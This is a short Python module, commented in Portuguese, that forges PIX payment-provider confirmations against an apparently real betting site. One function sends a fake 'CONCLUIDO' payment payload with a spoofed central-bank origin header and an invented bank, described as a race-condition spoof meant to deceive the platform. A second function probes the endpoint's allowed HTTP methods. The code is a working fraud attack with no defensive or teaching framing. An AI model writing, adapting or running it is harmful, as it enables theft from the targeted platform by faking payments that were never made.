import time
import random
import string
import requests
from config.config_loader import load_headers_template

def simulate_psp_response(jwt_token, endpoint, valor, txid, recebedor):
    """Simula resposta legítima do PSP para enganar a plataforma"""
    # Payload simulado de resposta do PSP
    spoof_payload = {
        "status": "CONCLUIDO",
        "valor": f"{valor:.2f}",
        "txid": txid,
        "banco_origem": "999 - FAKEBANK",
        "nome": recebedor,
        "jwt": jwt_token,
        "confirma": True
    }

    # Headers baseados no template
    spoof_headers = load_headers_template().copy()
    spoof_headers.update({
        "X-Spoof-Origin": "psp.bcb.gov.br",
        "X-Priority": "high",
        "Authorization": f"Bearer {jwt_token}"
    })

    # Envio simulado antecipado (race condition spoof)
    try:
        url_final = endpoint if endpoint.startswith("http") else f"https://d333bet.com{endpoint}"
        response = requests.post(url_final, json=spoof_payload, headers=spoof_headers, timeout=4)
        return response.status_code, response.text
    except Exception as e:
        return 0, str(e)

def discover_psp_info(endpoint):
    """Descobre métodos permitidos e status do endpoint PSP via HTTP OPTIONS"""
    # Monta URL final
    url = endpoint if endpoint.startswith("http") else f"https://d333bet.com{endpoint}"
    try:
        resp = requests.options(url, timeout=4)
        allow = resp.headers.get('Allow', '')
        methods = [m.strip() for m in allow.split(',')] if allow else []
        return {
            'url': url,
            'status_code': resp.status_code,
            'methods_allowed': methods
        }
    except Exception as e:
        return {'error': str(e)} 